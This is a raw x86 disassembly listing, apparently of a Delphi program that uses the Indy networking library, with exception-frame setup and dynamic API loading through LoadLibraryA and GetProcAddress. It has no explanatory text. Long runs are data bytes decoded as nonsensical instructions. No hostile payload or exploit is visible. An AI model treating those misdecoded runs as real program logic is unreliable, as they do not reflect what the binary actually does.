add [ eax ] al
add [ eax ] al
add ah ah
add [ edi ] eax
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004700 ] dh
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
pop esp
xor eax 0x35600040
outsd
jae r-xdata
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
je r-xdata
push esp
add al [ edi ]
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
les eax [ edx ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
add al [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
js r-xdata
inc ebp
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
dec esp
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ edi ] al
or al 0x0
shl [ ebx + eax + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax + 0xc0047 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add eax [ edi ]
or al 0x0
outsd
jb r-xdata
push esp
jb r-xdata
outsb
push edx
jne r-xdata
outsd
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ edx ] 0x1
outsb
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] bh
inc edi
nop
jb r-xdata
nop
inc eax
add [ eax ] bh
add eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
outsd
outsb
outsb
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
inc ebp
jb r-xdata
or al 0x4
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax + 0x47 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ edx ] 0x1
push esp
dec esp
inc ebp
js r-xdata
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
inc edi
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x4
outsd
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
pop ebx
pop ebp
retn 0x4
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dl
inc ebp
dec ecx
dec ecx
xor eax 0x35600040
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
aam 0x4
inc edi
add [ eax ] al
add [ eax ] al
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add al 0x47
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] dh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dh
add eax 0x450e0047
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
je r-xdata
sub_4704e8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40bd8c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_470530
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40bd8c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_470578
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47059d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4705a4
retn
sub_4705b3
add al ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax + 0x640000fe ] dh
jbe r-xdata
mov edx 0x640000fe
add [ ecx + 0x640000fe ] dh
jbe r-xdata
movsb [ edi ] [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000fe ] bh
jbe r-xdata
mov ebx 0x640000fe
add [ edx + 0x640000fe ] dh
jbe r-xdata
scasd [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + 0x640000fe ] ah
jbe r-xdata
movsd [ edi ] [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + edi * 8 + 0x76640000 ] bh
dec ecx
mov esp 0x640000fe
jbe r-xdata
add [ ebx + 0x640000fe ] dh
jbe r-xdata
0x640000fe 0x4976
add [ ecx + 0x640000fe ] dl
jbe r-xdata
nop
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + 0x640000fe ] ah
jbe r-xdata
cmpsd [ esi ] [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + 0x640000fe ] bh
jbe r-xdata
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp + 0x640000fe ] bh
jbe r-xdata
mov ebp 0x640000fe
add [ esi + edi * 8 + 0x76640000 ] dh
dec ecx
add [ ebp + 0x640000fe ] dh
jbe r-xdata
sbb al 0x9
add [ esi + edi * 8 - 0x74ab0000 ] bl
fwait
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000fe ] dl
jbe r-xdata
xchg ecx eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax + 0x640000fe ] ch
jbe r-xdata
xchg edx eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx + 0x640000fe ] ch
test al 0xfe
add [ eax ] al
jbe r-xdata
add [ edi + 0x640000fe ] bh
jbe r-xdata
mov edi 0x640000fe
add [ esi + 0x640000fe ] dh
jbe r-xdata
add [ eax ] bl
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
cmovne ecx [ ecx + 0x64 ]
push edi
push ebx
xor dl [ ebx + 0x74 ]
jne r-xdata
inc esi
in al dx
xor eax eax
push ebp
push sub_4708bd
pushfd
inc [ eax ]
add [ ebp - 0x75 ] dl
add [ ebx + 0x640000fe ] dl
jbe r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
rcl [ ebp + 0x68 ] 0xbd
or [ edi ] al
add [ esi + edi * 8 + 0x76640000 ] dl
dec ecx
xchg ebx eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000fe ] ch
jbe r-xdata
jbe r-xdata
test eax 0x640000fe
add [ eax + 0x640000fe ] ah
jbe r-xdata
mov al [ 0x640000fe ]
add [ edi + 0x640000fe ] dh
jbe r-xdata
lea eax [ ebx + 0x10 ]
call sub_40416c
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404498
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40bd8c
inc ebp
jb r-xdata
jpo r-xdata
add [ esi + 0x640000fe ] dl
jbe r-xdata
add [ ebp + 0x640000fe ] dl
jbe r-xdata
xchg esp eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000fe ] ch
jbe r-xdata
stosb [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx + 0x640000fe ] ah
jbe r-xdata
mov eax [ 0x640000fe ]
add [ eax + 0x640000fe ] bh
jbe r-xdata
hlt
outsd
jb r-xdata
add [ ecx + edi * 8 + 0x46 ] dh
mov [ fs : eax ] edx
push r-xdata
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
add [ edi + 0x640000fe ] dl
jbe r-xdata
xchg ebp eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + edi * 8 + 0x76640000 ] ch
dec ecx
stosd [ edi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx + 0x640000fe ] ah
jbe r-xdata
mov [ 0x640000fe ] al
add [ ecx + 0x640000fe ] bh
jbe r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
or [ edi ] eax
sbb [ eax ] al
add [ eax ] al
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] bl
rcl [ ebp - 0x75 ] 0xec
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
retn
add [ eax + 0x640000fe ] bl
jbe r-xdata
xchg edi eax
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ esi + 0x640000fe ] ch
jbe r-xdata
add [ ebp + 0x640000fe ] ch
jbe r-xdata
lodsb [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx + 0x640000fe ] ah
jbe r-xdata
mov [ 0x640000fe ] eax
jbe r-xdata
add [ edx + 0x640000fe ] bh
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4709e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_40416c
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403668
pop ebp
retn
add [ ecx + 0x640000fe ] bl
jbe r-xdata
cwde
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + 0x640000fe ] ch
jbe r-xdata
lodsd [ esi ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebp + 0x640000fe ] ah
jbe r-xdata
add [ esi + edi * 8 + 0x76640000 ] ah
dec ecx
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b584
mov edx [ ebp - 0x8 ]
mov ecx edi
xor edx edx
mov eax ebx
call sub_40bd8c
jmp r-xdata
dec ecx
add [ ecx ] al
retn
add [ edx + 0x640000fe ] bl
jbe r-xdata
cdq
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax + 0x640000fe ] dl
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4709ef
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x640000fe ] bl
jbe r-xdata
sub_470948
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4709e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_40416c
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403668
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b584
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_40416c
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404498
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40bd8c
mov ecx edi
xor edx edx
mov eax ebx
call sub_40bd8c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4709ef
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
sub_4709ef
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4717cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_47186f
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471876
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409280
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_470948
call sub_403ad0
sub_471880
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_4718a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_471971
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_409280
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_470948
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471978
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4719af
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4719dc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4719e3
retn
call sub_470a20
sub_4719f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471a1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471a24
retn
sub_471a32
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x40047 ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax - 0x13ffb8dd ] cl
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
aam 0x1d
inc edi
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
js r-xdata
imul esi [ ebx + 0x74 ] 0x1ae8c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1b ] bh
inc edi
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
inc edi
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb al 0x47
add [ eax + eax ] cl
add [ eax ] al
mov [ ebx ] bl
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
arpl [ ebx - 0x70 ] bp
aam 0x1b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sbb eax [ edi ]
or al 0x0
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
